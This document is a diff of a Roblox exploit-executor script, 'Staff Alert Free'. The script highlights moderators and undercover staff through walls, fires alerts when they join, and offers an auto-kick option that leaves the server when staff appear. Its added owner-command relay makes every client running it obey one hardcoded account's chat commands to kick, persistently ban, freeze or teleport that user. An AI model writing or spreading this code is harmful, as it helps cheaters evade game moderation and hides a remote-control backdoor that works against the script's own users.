@@ -1,5 +1,5 @@
 --========================================================--
---  Staff Alert Free by we1qxpo7j8fgkh3ok0ji
+--  Staff Alert Free by 01
 --  Keybind: T
 --  This script is private property.
 ----========================================================--
@@ -16,7 +16,7 @@ local GroupService = game:GetService("GroupService")
 
 local localPlayer = Players.LocalPlayer
 
-local function randomString(len)
+function randomString(len)
     local res = {}
     for i = 1, len do
         res[i] = string.char(math.random(97, 122))
@@ -36,29 +36,40 @@ local ids = {
 }
 
 local theme = {
-    BackgroundPrimary = Color3.fromRGB(5, 5, 15),
-    BackgroundSecondary = Color3.fromRGB(10, 10, 25),
-    BackgroundTertiary = Color3.fromRGB(15, 15, 35),
-    AccentPrimary = Color3.fromRGB(0, 100, 255),
-    AccentSecondary = Color3.fromRGB(31, 81, 255),
+    BackgroundPrimary = Color3.fromRGB(9, 17, 31),
+    BackgroundSecondary = Color3.fromRGB(17, 30, 52),
+    BackgroundTertiary = Color3.fromRGB(28, 48, 78),
+    AccentPrimary = Color3.fromRGB(68, 181, 255),
+    AccentSecondary = Color3.fromRGB(111, 137, 224),
+    AccentSteel = Color3.fromRGB(111, 157, 205),
+    AccentWarm = Color3.fromRGB(225, 157, 78),
+    AccentPink = Color3.fromRGB(168, 105, 188),
     TextPrimary = Color3.fromRGB(255, 255, 255),
-    TextSecondary = Color3.fromRGB(150, 180, 255),
-    Success = Color3.fromRGB(0, 255, 150),
-    Warning = Color3.fromRGB(255, 100, 0),
-    StaffPresent = Color3.fromRGB(255, 0, 0),
-    PossibleStaff = Color3.fromRGB(255, 220, 0),
+    TextSecondary = Color3.fromRGB(232, 231, 247),
+    Success = Color3.fromRGB(54, 210, 156),
+    Warning = Color3.fromRGB(255, 171, 64),
+    StaffPresent = Color3.fromRGB(255, 92, 120),
+    PossibleStaff = Color3.fromRGB(255, 214, 82),
+    OneStaff = Color3.fromRGB(255, 38, 62),
+    Owner = Color3.fromRGB(255, 226, 82),
     ToggleKey = Enum.KeyCode.T
 }
 
-local function isPlayerTyping()
+function isPlayerTyping()
     return UserInputService:GetFocusedTextBox() ~= nil
 end
 
 local config = {
     StaffESPEnabled = true,
+    OneStaffESPEnabled = true,
+    OneStaffTagsEnabled = true,
     NotificationsEnabled = true,
     SoundsEnabled = true,
-    AutoArmorEnabled = false,
+    TrueDespairStompEnabled = false,
+    -- Intentionally session-only: every execution starts with effects enabled.
+    OverseerStompEffectsEnabled = true,
+    StaffSaveSettings = false,
+    AutoKickEnabled = false,
 }
 
 local state = {
@@ -68,8 +79,15 @@ local state = {
     StaffESPFolder = nil,
     UndercoverESPFolder = nil,
     PossibleESPFolder = nil,
-    Notifications = {}
+    Notifications = {},
+    StaffClassificationCache = {},
+    KeybindCapture = false,
+
+    CancelKeybindCapture = nil,
 }
+
+local menuKey
+local staffCheckKey
 
 -- === GROUP CONFIG ===
 local MAIN_GROUP_IDS = { 848374803, 996191638  }
@@ -78,7 +96,7 @@ local POSSIBLE_STAFF_GROUP_IDS = { 922296613 }
 
 -- Group name cache — fetched live from Roblox, never hardcoded
 local groupNameCache = {}
-local function getGroupName(id)
+function getGroupName(id)
     if groupNameCache[id] then return groupNameCache[id] end
     local ok, info = pcall(function() return GroupService:GetGroupInfoAsync(id) end)
     local name = (ok and info and info.Name) or ("Group " .. id)
@@ -108,32 +126,43 @@ local UNDERCOVER_USERIDS = {
     [1] = true, [1] = true, [1] = true, [1] = true, [1] = true  -- < js everyone in the group not necessarily undercover | Mod
 }
 
-local SPECIAL_TAGS = {
-    [2309457259] = "[👑]",
-    [1115590282] = "[⚜️]",
-    [9242413057] = "[🪐]",
+-- These IDs are 01 Staff titles only. They are never treated as VF main staff.
+local ONE_STAFF_USERIDS = {
+    [9242413057] = true,
+    [2241675937] = true,
+    [1115590282] = true,
+    [386141208] = true,
+    [301447922] = true,
+    [9221310778] = true,
+    [2836808851] = true,
 }
 
 -- === HELPERS ===
-local function getSpecialTag(player)
-    return SPECIAL_TAGS[player.UserId] or ""
+function is01Staff(player)
+    return player and ONE_STAFF_USERIDS[player.UserId] == true
 end
 
-local function getDisplayName(player)
-    local tag = getSpecialTag(player)
-    if tag ~= "" then
-        return tag .. " " .. player.DisplayName
+function isOwner(player)
+    return player and player.UserId == 2309457259
+end
+
+function getDisplayName(player)
+    if isOwner(player) then
+        return "[👑]" .. player.DisplayName
+    end
+    if is01Staff(player) then
+        return "[🛡️]" .. player.DisplayName
     end
     return player.DisplayName
 end
 
-local function tween(obj, props, time, style)
+function tween(obj, props, time, style)
     local t = TweenService:Create(obj, TweenInfo.new(time or 0.3, style or Enum.EasingStyle.Quad), props)
     t:Play()
     return t
 end
 
-local function addGlow(parent, color, transparency)
+function addGlow(parent, color, transparency)
     local glow = Instance.new("ImageLabel")
     glow.Name = randomString(6)
     glow.BackgroundTransparency = 1
@@ -147,7 +176,7 @@ local function addGlow(parent, color, transparency)
     glow.Parent = parent
 end
 
-local function addGradient(parent, c1, c2, rot)
+function addGradient(parent, c1, c2, rot)
     local grad = Instance.new("UIGradient")
     grad.Color = ColorSequence.new(c1, c2)
     grad.Rotation = rot or 90
@@ -155,7 +184,7 @@ local function addGradient(parent, c1, c2, rot)
 end
 
 -- === NOTIFICATIONS ===
-local function updateNotifPositions()
+function updateNotifPositions()
     local stackOffset = 0
     for i, notif in ipairs(state.Notifications) do
         local targetPos = UDim2.new(1, -320, 0.95, -stackOffset)
@@ -165,9 +194,9 @@ local function updateNotifPositions()
 end
 
 -- outlineColor (5th arg) overrides the type-based color when provided
--- force (6th arg) bypasses the NotificationsEnabled toggle (used for F1 check)
+-- force (6th arg) bypasses the NotificationsEnabled toggle (used for manual staff checks)
 -- fitLines (7th arg) gives a notification enough height for every explicit line.
-local function notify(title, text, duration, type, outlineColor, force, fitLines)
+function notify(title, text, duration, type, outlineColor, force, fitLines, glint)
     if not config.NotificationsEnabled and not force then return end
     local color
     if outlineColor then
@@ -195,6 +224,23 @@ local function notify(title, text, duration, type, outlineColor, force, fitLines
     stroke.Color = color
     stroke.Thickness = 2
     addGlow(frame, color, 0.6)
+    if glint then
+        local glintBar = Instance.new("Frame", frame)
+        glintBar.BackgroundColor3 = Color3.fromRGB(255, 255, 215)
+        glintBar.BackgroundTransparency = 0.28
+        glintBar.BorderSizePixel = 0
+        glintBar.Position = UDim2.new(0, -80, 0, 0)
+        glintBar.Size = UDim2.new(0, 52, 1, 0)
+        glintBar.Rotation = 18
+        glintBar.ZIndex = 10002
+        task.spawn(function()
+            while glintBar.Parent do
+                glintBar.Position = UDim2.new(0, -80, 0, 0)
+                tween(glintBar, {Position = UDim2.new(1, 25, 0, 0)}, 1.15, Enum.EasingStyle.Linear)
+                task.wait(2.2)
+            end
+        end)
+    end
 
     local tl = Instance.new("TextLabel", frame)
     tl.BackgroundTransparency = 1
@@ -235,8 +281,308 @@ local function notify(title, text, duration, type, outlineColor, force, fitLines
     end)
 end
 
+-- === PERSISTENT SETTINGS ===
+-- File APIs are preferred when the executor exposes them. getgenv provides a
+-- session fallback so settings still remain stable after the menu is rebuilt.
+local SETTINGS_FILE = "VF_StaffAlert_Settings.txt"
+local settingsEnv = {}
+pcall(function()
+    settingsEnv = type(getgenv) == "function" and getgenv() or _G
+end)
+if type(settingsEnv) ~= "table" then settingsEnv = {} end
+
+function encodeSetting(value)
+    if value == nil then return "" end
+    if type(value) == "boolean" then return value and "true" or "false" end
+    return tostring(value)
+end
+
+function decodeSetting(raw, default)
+    if raw == nil or raw == "" then return default end
+    if type(default) == "boolean" then
+        return tostring(raw):lower() == "true"
+    elseif type(default) == "number" then
+        return tonumber(raw) or default
+    end
+    return raw
+end
+
+function loadSetting(name, default)
+    local value = settingsEnv[name]
+    if value ~= nil then return decodeSetting(value, default) end
+    if type(isfile) == "function" and type(readfile) == "function" then
+        local ok, raw = pcall(function()
+            if not isfile(SETTINGS_FILE) then return nil end
+            local contents = readfile(SETTINGS_FILE)
+            for line in string.gmatch(contents, "[^\r\n]+") do
+                local key, stored = line:match("^([^=]+)=(.*)$")
+                if key == name then return stored end
+            end
+            return nil
+        end)
+        if ok and raw ~= nil then return decodeSetting(raw, default) end
+    end
+    return default
+end
+
+function saveSetting(name, value)
+    settingsEnv[name] = encodeSetting(value)
+    if type(writefile) ~= "function" then return true end
+
+    local values = {}
+    if type(isfile) == "function" and type(readfile) == "function" then
+        pcall(function()
+            if isfile(SETTINGS_FILE) then
+                for line in string.gmatch(readfile(SETTINGS_FILE), "[^\r\n]+") do
+                    local key, stored = line:match("^([^=]+)=(.*)$")
+                    if key and key ~= name then values[key] = stored end
+                end
+            end
+        end)
+    end
+    values[name] = encodeSetting(value)
+
+    local lines = {}
+    for key, stored in pairs(values) do
+        table.insert(lines, key .. "=" .. stored)
+    end
+    table.sort(lines)
+    local ok = pcall(function() writefile(SETTINGS_FILE, table.concat(lines, "\n")) end)
+    return ok
+end
+
+function saveSettingWithNotice(name, value, title)
+    if not saveSetting(name, value) then
+        notify(title or "SETTINGS", "Could not save this setting.", 3, "warning")
+        return false
+    end
+    return true
+end
+
+-- Settings are opt-in per submenu. Feature enable states and resolver states
+-- intentionally remain session-only and always start disabled.
+config.StaffSaveSettings = loadSetting("StaffSaveSettings", false)
+if config.StaffSaveSettings then
+    config.StaffESPEnabled = loadSetting("StaffESPEnabled", config.StaffESPEnabled)
+    config.NotificationsEnabled = loadSetting("NotificationsEnabled", config.NotificationsEnabled)
+    config.SoundsEnabled = loadSetting("SoundsEnabled", config.SoundsEnabled)
+    config.AutoKickEnabled = loadSetting("AutoKickEnabled", config.AutoKickEnabled)
+end
+-- A client-side script cannot create a real Roblox server ban. This stores a
+-- best-effort local ban against the current server JobId when file persistence
+-- is available, so the script will refuse to initialize again in that server.
+do
+    local ownerBanKey = "01StaffAlert_BannedJob_" .. tostring(game.JobId)
+    if loadSetting(ownerBanKey, false) then
+        localPlayer:Kick("Banned from this server.")
+        return
+    end
+end
+
+-- Owner-only client command relay. Every injected 01 Staff and Free client
+-- listens for the Overseer's commands, so the owner does not need this script.
+-- This is local enforcement only; it cannot create an authoritative Roblox
+-- server ban or control clients that are not running this script.
+do
+    local ownerBanKey = "01StaffAlert_BannedJob_" .. tostring(game.JobId)
+    local lastCommand
+    local lastCommandAt = 0
+
+    state.OwnerCommand = state.OwnerCommand or {
+        Frozen = false,
+        FreezeConnection = nil,
+        Original = nil,
+    }
+
+    local function getOwnerPlayer()
+        return Players:GetPlayerByUserId(2309457259)
+    end
+
+    local function trimCommandText(value)
+        return tostring(value or "")
+            :gsub("^%s+", "")
+            :gsub("%s+$", "")
+    end
+
+    local function commandTargetsLocalPlayer(candidate)
+        candidate = trimCommandText(candidate)
+            :gsub("^@", "")
+            :gsub("^%[", "")
+            :gsub("%]$", "")
+        if #candidate < 2 then return false end
+
+        local lowered = candidate:lower()
+        local username = localPlayer.Name:lower()
+        local displayName = localPlayer.DisplayName:lower()
+        return username == lowered
+            or displayName == lowered
+            or username:find(lowered, 1, true) ~= nil
+            or displayName:find(lowered, 1, true) ~= nil
+    end
+
+    local function resolveCommandTarget(targetText)
+        targetText = trimCommandText(targetText)
+        if targetText == "" or targetText == "." then return "all", "" end
+
+        local words = {}
+        for word in targetText:gmatch("%S+") do
+            table.insert(words, word)
+        end
+        if #words == 0 then return "all", "" end
+        if words[1] == "." then
+            return "all", table.concat(words, " ", 2)
+        end
+
+        -- Try the longest name first so display names containing spaces work.
+        -- Any remaining words become the optional kick/ban reason.
+        for count = #words, 1, -1 do
+            local candidate = table.concat(words, " ", 1, count)
+            if commandTargetsLocalPlayer(candidate) then
+                return localPlayer, table.concat(words, " ", count + 1)
+            end
+        end
+        return nil, ""
+    end
+
+    local function commandAffectsLocalPlayer(target)
+        return target == "all" or target == localPlayer
+    end
+
+    local function freezeLocalCharacter()
+        local character = localPlayer.Character
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        local root = humanoid and humanoid.RootPart
+        if not humanoid or not root then return end
+
+        state.OwnerCommand.Original = {
+            Character = character,
+            WalkSpeed = humanoid.WalkSpeed,
+            JumpPower = humanoid.JumpPower,
+            AutoRotate = humanoid.AutoRotate,
+            Anchored = root.Anchored,
+        }
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+        humanoid.AutoRotate = false
+        root.Anchored = true
+    end
+
+    local function unfreezeLocalCharacter()
+        local character = localPlayer.Character
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        local root = humanoid and humanoid.RootPart
+        local original = state.OwnerCommand.Original
+        if humanoid then
+            humanoid.WalkSpeed = original and original.WalkSpeed or 16
+            humanoid.JumpPower = original and original.JumpPower or 50
+            humanoid.AutoRotate = original == nil and true or original.AutoRotate
+        end
+        if root then
+            root.Anchored = original and original.Anchored or false
+        end
+        state.OwnerCommand.Original = nil
+    end
+
+    local function setFrozen(frozen)
+        state.OwnerCommand.Frozen = frozen
+        if state.OwnerCommand.FreezeConnection then
+            state.OwnerCommand.FreezeConnection:Disconnect()
+            state.OwnerCommand.FreezeConnection = nil
+        end
+        if frozen then
+            freezeLocalCharacter()
+            state.OwnerCommand.FreezeConnection = localPlayer.CharacterAdded:Connect(function()
+                task.wait(0.25)
+                if state.OwnerCommand.Frozen then freezeLocalCharacter() end
+            end)
+        else
+            unfreezeLocalCharacter()
+        end
+    end
+
+    local function bringLocalPlayer()
+        local owner = getOwnerPlayer()
+        local ownerCharacter = owner and owner.Character
+        local ownerHumanoid = ownerCharacter and ownerCharacter:FindFirstChildOfClass("Humanoid")
+        local ownerRoot = ownerHumanoid and ownerHumanoid.RootPart
+        local character = localPlayer.Character
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        local root = humanoid and humanoid.RootPart
+        if root and ownerRoot then
+            root.CFrame = ownerRoot.CFrame * CFrame.new(0, 0, -4)
+            pcall(function() character:PivotTo(root.CFrame) end)
+        end
+    end
+
+    local function handleOwnerCommand(userId, rawText)
+        if localPlayer.UserId == 2309457259 or tonumber(userId) ~= 2309457259 then
+            return
+        end
+
+        local text = trimCommandText(rawText)
+        local command, targetText = text:match("^(/%S+)%s*(.*)$")
+        command = command and command:lower()
+        if command ~= "/kick"
+            and command ~= "/ban"
+            and command ~= "/freeze"
+            and command ~= "/unfreeze"
+            and command ~= "/bring" then
+            return
+        end
+
+        local dedupeKey = command .. " " .. (targetText or "")
+        local now = os.clock()
+        if dedupeKey == lastCommand and now - lastCommandAt < 0.2 then return end
+        lastCommand = dedupeKey
+        lastCommandAt = now
+
+        local target, reason = resolveCommandTarget(targetText)
+        if not target then return end
+
+        task.defer(function()
+            if not commandAffectsLocalPlayer(target) then return end
+            if command == "/kick" or command == "/ban" then
+                if command == "/ban" then saveSetting(ownerBanKey, true) end
+                local message = command == "/ban" and "Banned by Staff" or "Kicked by Staff"
+                if reason and reason ~= "" then
+                    message = message .. ": " .. reason
+                end
+                pcall(function() localPlayer:Kick(message) end)
+            elseif command == "/freeze" then
+                setFrozen(true)
+            elseif command == "/unfreeze" then
+                setFrozen(false)
+            elseif command == "/bring" then
+                bringLocalPlayer()
+            end
+        end)
+    end
+
+    local function connectLegacyChat(player)
+        if player.UserId ~= 2309457259 then return end
+        player.Chatted:Connect(function(message)
+            handleOwnerCommand(player.UserId, message)
+        end)
+    end
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        connectLegacyChat(player)
+    end
+    Players.PlayerAdded:Connect(connectLegacyChat)
+
+    pcall(function()
+        local textChatService = game:GetService("TextChatService")
+        textChatService.MessageReceived:Connect(function(message)
+            local source = message.TextSource
+            if source then
+                handleOwnerCommand(source.UserId, message.Text)
+            end
+        end)
+    end)
+end
+
 -- === STAFF LOGIC ===
-local function playSound(id, vol)
+function playSound(id, vol)
     if not config.SoundsEnabled then return end
     local s = Instance.new("Sound")
     s.SoundId = id
@@ -247,7 +593,7 @@ local function playSound(id, vol)
 end
 
 -- Returns a list of {id, role} for every main staff group the player is in
-local function getMainMemberships(player)
+function getMainMemberships(player)
     local result = {}
     for _, gid in ipairs(MAIN_GROUP_IDS) do
         local ok, inGroup = pcall(function() return player:IsInGroup(gid) end)
@@ -260,7 +606,7 @@ local function getMainMemberships(player)
 end
 
 -- Returns a list of {id, role} for every possible staff group the player is in
-local function getPossibleMemberships(player)
+function getPossibleMemberships(player)
     local result = {}
     for _, gid in ipairs(POSSIBLE_STAFF_GROUP_IDS) do
         local ok, inGroup = pcall(function() return player:IsInGroup(gid) end)
@@ -272,7 +618,7 @@ local function getPossibleMemberships(player)
     return result
 end
 
-local function isUndercover(player, alreadyInMain)
+function isUndercover(player, alreadyInMain)
     if not UNDERCOVER_USERIDS[player.UserId] then return false end
     if alreadyInMain ~= nil then return not alreadyInMain end
     for _, gid in ipairs(MAIN_GROUP_IDS) do
@@ -283,13 +629,28 @@ local function isUndercover(player, alreadyInMain)
 end
 
 -- Builds the notifier title, body, and outline colour for a join/leave event
-local function buildNotif(player, action, mains, possible)
+function buildNotif(player, action, mains, possible)
     local dn = getDisplayName(player)
     local un = player.Name
     mains = mains or {}
+    possible = possible or {}
     local inMain = #mains > 0
     local inPossible = #possible > 0
     local title, body, color
+
+    if isOwner(player) then
+        color = theme.Owner
+        title = "👑 OVERSEER • " .. dn
+        body = dn .. " (@" .. un .. ") • OVERSEER — " .. action
+        return title, body, color
+    end
+
+    if is01Staff(player) then
+        color = theme.OneStaff
+        title = "01 STAFF • " .. dn
+        body = dn .. " (@" .. un .. ") • ADMIN / 01 STAFF — " .. action
+        return title, body, color
+    end
 
     if inMain and inPossible then
         -- Green (main has priority)
@@ -345,47 +706,204 @@ state.PossibleESPFolder.Name = "PossibleStaffESP"
 
 -- Priority: Main > Undercover > Possible
 -- Returns "main", "undercover", or "possible" (or nil if none)
-local function getPlayerCategory(inMain, isU, inPossible)
+function getPlayerCategory(inMain, isU, inPossible, is01, ownerPlayer)
+    if ownerPlayer then return "owner" end
+    if is01 then return "01staff" end
     if inMain then return "main" end
     if isU    then return "undercover" end
     if inPossible then return "possible" end
     return nil
 end
 
-local function applyESP(player)
-    if not player or not player.Parent then return end
-
-    local specialTag = SPECIAL_TAGS[player.UserId]
-    if specialTag then
-        local function updateDisplay()
-            pcall(function()
-                if player.Character and player.Character:FindFirstChild("Humanoid") then
-                    player.Character.Humanoid.DisplayName = specialTag .. " " .. player.DisplayName
-                end
-            end)
-        end
-        player.CharacterAdded:Connect(function()
-            task.wait(0.5)
-            updateDisplay()
-        end)
-        if player.Character then updateDisplay() end
-    end
-
+function classifyStaffPlayer(player)
+    if not player then return nil end
     local mains      = getMainMemberships(player)
     local possible   = getPossibleMemberships(player)
     local inMain     = #mains > 0
     local inPossible = #possible > 0
     local isU        = isUndercover(player, inMain)
-    local category   = getPlayerCategory(inMain, isU, inPossible)
+    local is01       = is01Staff(player)
+    local ownerPlayer = isOwner(player)
+    return {
+        mains = mains,
+        possible = possible,
+        inMain = inMain,
+        inPossible = inPossible,
+        isUndercover = isU,
+        is01 = is01,
+        owner = ownerPlayer,
+        category = getPlayerCategory(inMain, isU, inPossible, is01, ownerPlayer),
+    }
+end
 
-    if not category then return end
+function classificationPriority(category)
+    return ({
+        owner = 5,
+        ["01staff"] = 4,
+        main = 3,
+        undercover = 2,
+        possible = 1,
+    })[category] or 0
+end
+
+local autoKickTriggered = false
+
+function getAutoKickRole(player)
+    if not player or player == localPlayer then return nil end
+    if isOwner(player) then return nil end
+    local mains = getMainMemberships(player)
+    local inMain = #mains > 0
+    if inMain then
+        return "staff"
+    end
+
+    -- Possible-staff membership is intentionally not enough to trigger this.
+    if isUndercover(player, false) then
+        return "undercover"
+    end
+    return nil
+end
+
+function autoKickPlayerIfNeeded(player)
+    if not config.AutoKickEnabled
+        or autoKickTriggered
+        or not player
+        or player == localPlayer
+        or not player.Parent then
+        return false
+    end
+
+    local role = getAutoKickRole(player)
+    if not role then return false end
+
+    autoKickTriggered = true
+    local roleLabel = role == "undercover" and "undercover staff" or "staff"
+    notify(
+        "AUTO KICK",
+        roleLabel .. " detected: " .. getDisplayName(player) .. "\nLeaving this server.",
+        4,
+        "warning",
+        nil,
+        true
+    )
+
+    task.delay(0.25, function()
+        pcall(function()
+            localPlayer:Kick("Auto Kick: " .. roleLabel .. " joined the server.")
+        end)
+    end)
+    return true
+end
+
+function checkExistingPlayersForAutoKick()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if autoKickPlayerIfNeeded(player) then break end
+    end
+end
+
+local ROLE_TAG_NAME = "StaffAlertRoleTag"
+local roleDisplayState = setmetatable({}, {__mode = "k"})
+
+local function removeRoleTag(character)
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    local legacyTag = character and character:FindFirstChild(ROLE_TAG_NAME)
+    if legacyTag then legacyTag:Destroy() end
+    local saved = humanoid and roleDisplayState[humanoid]
+    if saved then
+        if saved.GuardConnection then
+            saved.GuardConnection:Disconnect()
+            saved.GuardConnection = nil
+        end
+        humanoid.DisplayName = saved.DisplayName
+        humanoid.DisplayDistanceType = saved.DisplayDistanceType
+        roleDisplayState[humanoid] = nil
+    end
+end
+
+local function updateRoleTag(player, category, character)
+    if not character or (category ~= "owner" and category ~= "01staff") then
+        removeRoleTag(character)
+        return
+    end
+
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if not humanoid then
+        task.spawn(function()
+            local readyHumanoid = character:WaitForChild("Humanoid", 10)
+            if readyHumanoid and character.Parent and player.Parent then
+                updateRoleTag(player, category, character)
+            end
+        end)
+        return
+    end
+    local legacyTag = character:FindFirstChild(ROLE_TAG_NAME)
+    if legacyTag then legacyTag:Destroy() end
+    if not roleDisplayState[humanoid] then
+        roleDisplayState[humanoid] = {
+            DisplayName = humanoid.DisplayName,
+            DisplayDistanceType = humanoid.DisplayDistanceType,
+        }
+    end
+    local saved = roleDisplayState[humanoid]
+    if not saved.GuardConnection then
+        saved.GuardConnection = humanoid:GetPropertyChangedSignal("DisplayName"):Connect(function()
+            if not character.Parent or not player.Parent then return end
+            if not config.OneStaffTagsEnabled then return end
+            local expected = (category == "owner" and "[👑]" or "[🛡️]") .. player.DisplayName
+            if humanoid.DisplayName ~= expected then
+                humanoid.DisplayName = expected
+            end
+        end)
+    end
+    local showTag = config.OneStaffTagsEnabled
+    humanoid.DisplayName = showTag
+        and ((category == "owner" and "[👑]" or "[🛡️]") .. player.DisplayName)
+        or saved.DisplayName
+    humanoid.DisplayDistanceType = showTag
+        and Enum.HumanoidDisplayDistanceType.Viewer
+        or saved.DisplayDistanceType
+end
+
+local function applyESP(player, classification)
+    if not player or not player.Parent then return end
+
+    classification = classification or classifyStaffPlayer(player)
+    if not classification then return end
+    state.StaffClassificationCache[player.UserId] = classification
+    local mains      = classification.mains
+    local possible   = classification.possible
+    local inPossible = classification.inPossible
+    local category   = classification.category
+    local oldPossibleHighlight = state.PossibleESPFolder:FindFirstChild("PHL_" .. player.UserId)
+    if oldPossibleHighlight then oldPossibleHighlight:Destroy() end
+
+    if not category then
+        removeRoleTag(player.Character)
+        return
+    end
 
     local function attach(char)
         if not char then return end
+        if category == "possible" then
+            removeRoleTag(char)
+            return
+        end
         local key, folder, fillClr, outlineClr
-        if category == "main" then
+        if category == "owner" then
+            key    = "OWNERHL_" .. player.UserId
+            folder = state.StaffESPFolder
+            fillClr    = theme.Owner
+            outlineClr = theme.Owner
+        elseif category == "01staff" then
+            key    = "O1HL_"  .. player.UserId
+            folder = state.StaffESPFolder
+            fillClr    = theme.OneStaff
+            outlineClr = theme.OneStaff
+        elseif category == "main" then
             key    = "HL_"  .. player.UserId
             folder = state.StaffESPFolder
+            fillClr    = theme.Success
+            outlineClr = theme.Success
         elseif category == "undercover" then
             key    = "UHL_" .. player.UserId
             folder = state.UndercoverESPFolder
@@ -406,11 +924,21 @@ local function applyESP(player)
         hl.OutlineTransparency = 0.1
         hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
         hl.Enabled = config.StaffESPEnabled
+            and (category ~= "01staff" and category ~= "owner" or config.OneStaffESPEnabled)
         if fillClr    then hl.FillColor    = fillClr    end
         if outlineClr then hl.OutlineColor = outlineClr end
+        updateRoleTag(player, category, char)
     end
 
-    if category == "main" then
+    if category == "owner" then
+        local title, body, color = buildNotif(player, "joined", mains, possible)
+        notify(title, body, 6, nil, color, true, 3, true)
+        playSound("rbxassetid://8887499160", 2.4)
+    elseif category == "01staff" then
+        local title, body, color = buildNotif(player, "joined", mains, possible)
+        notify(title, body, 5, nil, color)
+        playSound("rbxassetid://8887499160", 2)
+    elseif category == "main" then
         local title, body, color = buildNotif(player, "joined", mains, possible)
         notify(title, body, 5, nil, color)
         playSound("rbxassetid://8887499160", 2)
@@ -429,30 +957,84 @@ local function applyESP(player)
     else
         local title, body, _ = buildNotif(player, "joined", nil, possible)
         notify(title, body, 5, nil, theme.PossibleStaff)
-        playSound("rbxassetid://8887499160", 2)
     end
 
     if player.Character then attach(player.Character) end
     player.CharacterAdded:Connect(attach)
 end
 
+local function setOneStaffESPEnabled(value)
+    config.OneStaffESPEnabled = value
+    saveSettingWithNotice("OneStaffESPEnabled", value, "PROFILE")
+    for _, highlight in ipairs(state.StaffESPFolder:GetChildren()) do
+        if highlight:IsA("Highlight")
+            and (highlight.Name:match("^O1HL_") or highlight.Name:match("^OWNERHL_")) then
+            highlight.Enabled = config.StaffESPEnabled and value
+        end
+    end
+end
+
+local function setOneStaffTagsEnabled(value)
+    config.OneStaffTagsEnabled = value
+    saveSettingWithNotice("OneStaffTagsEnabled", value, "PROFILE")
+    for _, player in ipairs(Players:GetPlayers()) do
+        local character = player.Character
+        if player ~= localPlayer and character then
+            local category = isOwner(player) and "owner"
+                or (is01Staff(player) and "01staff" or nil)
+            if category then
+                updateRoleTag(player, category, character)
+            else
+                removeRoleTag(character)
+            end
+        end
+    end
+end
+
 local function onPlayerRemoving(player)
-    local mains      = getMainMemberships(player)
-    local possible   = getPossibleMemberships(player)
-    local inMain     = #mains > 0
-    local inPossible = #possible > 0
-    local isU        = isUndercover(player, inMain)
-    local category   = getPlayerCategory(inMain, isU, inPossible)
+    local classification = state.StaffClassificationCache[player.UserId]
+        or classifyStaffPlayer(player)
+    if classification and not classification.category then
+        -- A departing Player can still answer group requests for a brief
+        -- window. Retry before giving up so a late group response is not lost.
+        for _ = 1, 3 do
+            if classification.category then break end
+            task.wait(0.2)
+            local latest = classifyStaffPlayer(player)
+            if classificationPriority(latest.category) > classificationPriority(classification.category) then
+                classification = latest
+            end
+        end
+    end
+    state.StaffClassificationCache[player.UserId] = nil
+    if not classification then return end
+    local mains      = classification.mains
+    local possible   = classification.possible
+    local inPossible = classification.inPossible
+    local category   = classification.category
 
     if not category then return end
-    playSound("rbxassetid://1091083826", 2)
 
-    if category == "main" then
+    if category == "owner" then
+        playSound("rbxassetid://1091083826", 2)
+        local title, body, color = buildNotif(player, "left", mains, possible)
+        notify(title, body, 5, nil, color, true, 3, true)
+        local hl = state.StaffESPFolder:FindFirstChild("OWNERHL_" .. player.UserId)
+        if hl then hl:Destroy() end
+    elseif category == "01staff" then
+        playSound("rbxassetid://1091083826", 2)
+        local title, body, color = buildNotif(player, "left", mains, possible)
+        notify(title, body, 5, nil, color)
+        local hl = state.StaffESPFolder:FindFirstChild("O1HL_" .. player.UserId)
+        if hl then hl:Destroy() end
+    elseif category == "main" then
+        playSound("rbxassetid://1091083826", 2)
         local title, body, color = buildNotif(player, "left", mains, possible)
         notify(title, body, 5, nil, color)
         local hl = state.StaffESPFolder:FindFirstChild("HL_" .. player.UserId)
         if hl then hl:Destroy() end
     elseif category == "undercover" then
+        playSound("rbxassetid://1091083826", 2)
         local dn = getDisplayName(player)
         local body = dn .. " has left the server."
         if inPossible then
@@ -473,23 +1055,8 @@ local function onPlayerRemoving(player)
     end
 end
 
--- Rainbow ESP: Heartbeat-driven for smooth, flicker-free colour cycling.
--- Hue is derived from elapsed wall-clock time so the animation stays
--- perfectly smooth regardless of frame rate or task-scheduler jitter.
-local RAINBOW_SPEED = 0.4  -- full colour cycle per second (raise = faster)
-do
-    local _rainbowStart = tick()
-    RunService.Heartbeat:Connect(function()
-        local hue = (tick() - _rainbowStart) * RAINBOW_SPEED % 1
-        local color = Color3.fromHSV(hue, 1, 1)
-        for _, obj in ipairs(state.StaffESPFolder:GetChildren()) do
-            if obj:IsA("Highlight") then
-                obj.FillColor    = color
-                obj.OutlineColor = color
-            end
-        end
-    end)
-end
+-- Main-group staff ESP stays a stable green so the category is immediately
+-- recognizable. Undercover and possible-staff colours remain unchanged.
 
 -- === UI IMPLEMENTATION ===
 local sg = Instance.new("ScreenGui", CoreGui.RobloxGui)
@@ -498,15 +1065,25 @@ sg.ResetOnSpawn = false
 
 local main = Instance.new("Frame", sg)
 main.Name = ids.main
+main.Visible = false
 main.BackgroundColor3 = theme.BackgroundPrimary
-main.Position = UDim2.new(0.5, -250, 0.5, -200)
-main.Size = UDim2.new(0, 500, 0, 400)
+main.Position = UDim2.new(0.5, -370, 0.5, -340)
+main.Size = UDim2.new(0, 740, 0, 680)
 Instance.new("UICorner", main).CornerRadius = UDim.new(0, 16)
+addGradient(main, theme.BackgroundPrimary, Color3.fromRGB(18, 35, 62), 35)
 local mainStroke = Instance.new("UIStroke", main)
 mainStroke.Color = theme.AccentPrimary
 mainStroke.Thickness = 3
 mainStroke.Transparency = 0.2
 addGlow(main, theme.AccentPrimary, 0.7)
+task.spawn(function()
+    while main.Parent do
+        tween(mainStroke, {Transparency = 0.05}, 1.8, Enum.EasingStyle.Sine)
+        task.wait(1.8)
+        tween(mainStroke, {Transparency = 0.32}, 1.8, Enum.EasingStyle.Sine)
+        task.wait(1.8)
+    end
+end)
 
 -- Topbar
 local topbar = Instance.new("Frame", main)
